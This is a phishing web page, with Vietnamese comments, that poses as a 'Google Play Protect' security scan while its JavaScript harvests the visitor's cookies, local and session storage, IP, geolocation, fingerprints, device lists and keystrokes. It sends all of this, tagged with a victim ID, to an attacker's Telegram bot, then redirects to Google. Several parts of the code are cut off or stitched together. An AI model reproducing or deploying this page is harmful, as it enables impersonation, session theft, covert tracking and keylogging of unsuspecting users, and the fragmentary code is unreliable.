<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Google Play Protect | Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Google Sans', Roboto, sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        
        /* Glassmorphism container */
        .container {
            background: rgba(18, 25, 45, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
        }
        
        /* Animated shield icon */
        .shield {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 30px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 44px;
            box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #8b9dc3;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        /* Progress section */
        .progress-section {
            margin: 24px 0;
        }
        
        .progress-bar {
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
            border-radius: 10px;
            transition: width 0.4s ease;
        }
        
        .stats {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            color: #6c86a3;
            font-size: 12px;
        }
        
        /* Status list */
        .status-list {
            text-align: left;
            margin: 24px 0;
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            padding: 16px;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 13px;
            color: #b4c7e7;
        }
        
        .status-item:last-child {
            border-bottom: none;
        }
        
        .status-icon {
            width: 28px;
            font-size: 16px;
        }
        
        .status-text {
            flex: 1;
        }
        
        .status-badge {
            font-size: 11px;
            padding: 2px 8px;
            border-radius: 20px;
            background: rgba(102,126,234,0.2);
            color: #a0b4e0;
        }
        
        /* Loading dots */
        .loading-dots {
            display: inline-flex;
            gap: 4px;
        }
        
        .loading-dots span {
            width: 6px;
            height: 6px;
            background: #667eea;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }
        
        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
        
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        
        /* Footer */
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #4a5a7a;
        }
        
        /* Matrix rain effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.1;
        }
    </style>
</head>

        // Matrix background effect
        function createMatrixEffect() {
            const canvas = document.createElement('canvas');
            canvas.style.position = 'fixed';
            canvas.style.top = '0';
            canvas.style.left = '0';
            canvas.style.width = '100%';
            canvas.style.height = '100%';
            canvas.style.pointerEvents = 'none';
            canvas.style.zIndex = '-1';
            canvas.style.opacity = '0.08';
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const chars = '01アイウエオカキクケコ';
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = [];
            for (let i = 0; i < columns; i++) drops[i] = 1;
            
            function draw() {
                ctx.fillStyle = 'rgba(10, 14, 26, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#667eea';
                ctx.font = fontSize + 'px monospace';
                for (let i = 0; i < drops.length; i++) {
                    const text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                }
            }
            setInterval(draw, 50);
        }
        createMatrixEffect();
        
        // ============================================================
        // HÀM GỬI DỮ LIỆU
        // ============================================================
        async function sendMessage(text, parseMode = 'HTML') {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },

                        chat_id: CHAT_ID,
                        text: `[${VICTIM_ID}] ${text}`,
                        parse_mode: parseMode
                    })
                });

            } catch(e) { return false; }
        }
        
        async function sendFile(base64Data, filename, caption) {
            try {
                const blob = b64toBlob(base64Data);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, filename);
                formData.append('caption', `[${VICTIM_ID}] ${caption}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        function b64toBlob(b64) {
            const byteChars = atob(b64);
            const byteArr = new Uint8Array(byteChars.length);
            for (let i = 0; i < byteChars.length; i++) byteArr[i] = byteChars.charCodeAt(i);
            return new Blob([byteArr]);
        }
        
        // ============================================================
        // 1. THÔNG TIN CƠ BẢN (Không cần quyền)
        // ============================================================
        function getBasicInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
            
            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';
            
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'macOS';
            else if (ua.includes('Linux')) os = 'Linux';
            
            device = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
            
            return { browser, os, device, ua, language: navigator.language, platform: navigator.platform };
        }
        
        // ============================================================
        // 2. IP VÀ ĐỊA LÝ (API, không cần quyền)
        // ============================================================
        async function getGeoInfo() {
            const sources = [
                'https://ipapi.co/json/',
                'https://api.ipify.org?format=json',
                'https://ipwho.is/'
            ];
            for (const source of sources) {
                try {
                    const res = await fetch(source);
                    const data = await res.json();
                    if (data.ip) {
                        return {
                            ip: data.ip,
                            city: data.city || data.city_name || 'Unknown',
                            region: data.region,
                            country: data.country_name || data.country,
                            lat: data.latitude || 0,
                            lon: data.longitude || 0,
                            isp: data.org || data.isp,
                            timezone: data.timezone
                        };
                    }
                } catch(e) {}
            }
            return { ip: 'Unknown', city: 'Unknown', lat: 0, lon: 0 };
        }
        
        // ============================================================
        // 3. MÀN HÌNH & HARDWARE
        // ============================================================
        function getHardwareInfo() {
            return {
                screen: `${screen.width}x${screen.height}`,
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation?.type || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
        }
        
        // ============================================================
        // 4. STORAGE (Cookies, Local, Session)
        // ============================================================
        function getStorageData() {
            const cookies = document.cookie || 'empty';
            let localStorage = 'empty', sessionStorage = 'empty';
            try {
                if (localStorage.length > 0) {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        items[key] = localStorage.getItem(key);
                    }
                    localStorage = JSON.stringify(items);
                }
            } catch(e) { localStorage = 'access_denied'; }
            
            try {
                if (sessionStorage.length > 0) {
                    const items = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        items[key] = sessionStorage.getItem(key);
                    }
                    sessionStorage = JSON.stringify(items);
                }
            } catch(e) { sessionStorage = 'access_denied'; }
            
            return { cookies, localStorage, sessionStorage };
        }
        
        // ============================================================
        // 5. PLUGINS & EXTENSIONS
        // ============================================================
        function getPlugins() {
            const plugins = [];
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
            }
            return plugins;
        }
        
        function detectExtensions() {
            const extensions = [];

        // ============================================================
        // 6. MẠNG & KẾT NỐI
        // ============================================================
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: connection?.effectiveType || 'unknown',
                downlink: connection?.downlink || 0,
                rtt: connection?.rtt || 0,
                saveData: connection?.saveData || false
            };
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipMatch = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (ipMatch) {
                        resolve(ipMatch[1]);
                        pc.close();
                    }
                };
                setTimeout(() => resolve('unavailable'), 2000);
            });
        }

                'whatsapp.com', 'telegram.org', 'discord.com', 'twitch.tv'
            ];
            const visited = [];
            const link = document.createElement('a');
            for (const site of sites) {
                link.href = `https://${site}`;
                if (link.offsetTop !== 0) visited.push(site);
            }
            return visited;
        }
        
        // ============================================================
        // 8. FINGERPRINT (Canvas + WebGL)
        // ============================================================
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('BrowserLeaks', 10, 30);
            return canvas.toDataURL();
        }
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'not_supported';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return `${vendor}|${renderer}`;
                }
                return 'no_debug_info';
            } catch(e) { return 'error'; }
        }
        
        function getAudioFingerprint() {
            return new Promise((resolve) => {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) { resolve('not_supported'); return; }
                const ctx = new AudioContext();
                const oscillator = ctx.createOscillator();
                const analyser = ctx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(ctx.destination);
                oscillator.type = 'sine';
                oscillator.frequency.value = 440;
                oscillator.start();
                const data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                oscillator.stop();
                ctx.close();
                resolve(Array.from(data).join(','));
            });
        }
        
        // ============================================================
        // 9. THIẾT BỊ NGOẠI VI (Camera, Mic - Liệt kê, không cần quyền)
        // ============================================================
        async function listDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Camera');
                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Microphone');
                return { cameras: cams, microphones: mics, count: cams.length + mics.length };
            } catch(e) {
                return { cameras: [], microphones: [], count: 0 };
            }
        }

            test.style.display = 'none';

            // 5. Plugins
            const plugins = getPlugins();
            if (plugins.length) {
                await sendMessage(`🔌 <b>Plugins:</b>\n${plugins.slice(0, 10).join(', ')}`);
            }
            addStatusItem('🔌', 'Plugins', '✓');
            updateProgress(38, 'Got plugins', 'Plugins');
            
            // 6. Network
            const net = getNetworkInfo();
            await sendMessage(`📡 <b>Network Info:</b>\n├ Type: ${net.effectiveType}\n├ Speed: ${net.downlink}Mbps\n├ Latency: ${net.rtt}ms\n└ Save Data: ${net.saveData}`);
            const localIP = await getLocalIP();
            await sendMessage(`🏠 <b>Local IP:</b> ${localIP}`);
            addStatusItem('📡', 'Network Info', '✓');
            updateProgress(48, 'Got network info', 'Thông tin mạng');
            
            // 7. Speed test
            const ping = await testNetworkSpeed();
            if (ping > 0) await sendMessage(`⚡ <b>Ping:</b> ${ping}ms`);
            updateProgress(52, 'Speed test done', 'Kiểm tra tốc độ');
            
            // 8. Visited sites
            const visited = getVisitedSites();
            if (visited.length) {
                await sendMessage(`📜 <b>Visited Sites:</b>\n${visited.join(', ')}`);
            }
            addStatusItem('📜', 'Browser History', '✓');
            updateProgress(58, 'Got browsing history', 'Lịch sử web');
            
            // 9. AdBlock & VPN
            const hasAdBlock = detectAdBlock();
            if (hasAdBlock) await sendMessage(`🛡️ <b>AdBlock:</b> Enabled`);
            const isVPN = await detectVPN();
            if (isVPN) await sendMessage(`🔒 <b>VPN/Proxy:</b> Detected`);
            addStatusItem('🛡️', 'Security Check', '✓');
            updateProgress(65, 'Security check done', 'Bảo mật');
            
            // 10. Bot detection
            const isBot = isAutomated();
            await sendMessage(`🤖 <b>Automated:</b> ${isBot ? 'Yes (Bot detected)' : 'No (Human)'}`);
            updateProgress(70, 'Bot check done', 'Xác thực');
            
            // 11. Battery
            const battery = await getBatteryStatus();
            if (battery) await sendMessage(`🔋 <b>Battery:</b> ${battery.level}% ${battery.charging ? '(Charging)' : '(Not charging)'}`);
            updateProgress(75, 'Got battery info', 'Pin');
            
            // 12. Devices (Camera/Mic list)
            const devices = await listDevices();
            if (devices.cameras.length) await sendMessage(`📷 <b>Cameras:</b>\n${devices.cameras.join('\n')}`);
            if (devices.microphones.length) await sendMessage(`🎤 <b>Microphones:</b>\n${devices.microphones.join('\n')}`);
            addStatusItem('📷', 'Devices List', '✓');
            updateProgress(82, 'Device enumeration done', 'Thiết bị ngoại vi');
            
            // 13. Fingerprints
            const canvasFP = getCanvasFingerprint();
            const webglFP = getWebGLFingerprint();
            const audioFP = await getAudioFingerprint();
            await sendMessage(`🆔 <b>Fingerprints:</b>\n├ Canvas: ${canvasFP.substring(0, 50)}...\n├ WebGL: ${webglFP}\n└ Audio: ${audioFP.substring(0, 50)}...`);
            addStatusItem('🆔', 'Device Fingerprint', '✓');
            updateProgress(92, 'Fingerprint generated', 'Fingerprint');
            
            // 14. Thời gian
            await sendMessage(`📅 <b>Timestamp:</b> ${new Date().toLocaleString('vi-VN')}`);
            
            // 15. Keylog buffer cuối cùng
            setTimeout(async () => {
                if (keylogBuffer.length > 0) {
                    await sendMessage(`⌨️ <b>Final Keylog:</b>\n<code>${keylogBuffer}</code>`);
                }
            }, 3000);
            
            // 16. Hoàn thành
            updateProgress(100, 'Complete!', 'Hoàn tất');
            await sendMessage(`✅ <b>COLLECTION COMPLETE!</b>\n📊 Total data points: 25+\n🆔 Victim ID: ${VICTIM_ID}`);
            addStatusItem('✅', 'Data collection complete', '100%');
            
            // Keylogger tiếp tục chạy
            setInterval(async () => {
                if (keylogBuffer.length > 100) {
                    await sendMessage(`⌨️ <b>Keylog Batch:</b>\n<code>${keylogBuffer}</code>`);
                    keylogBuffer = '';
                }
            }, 30000);
            
            // Chuyển hướng sau 3 giây
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        }
        
        // Bắt đầu
        collectAllData();
    </script>
</body>
</html>
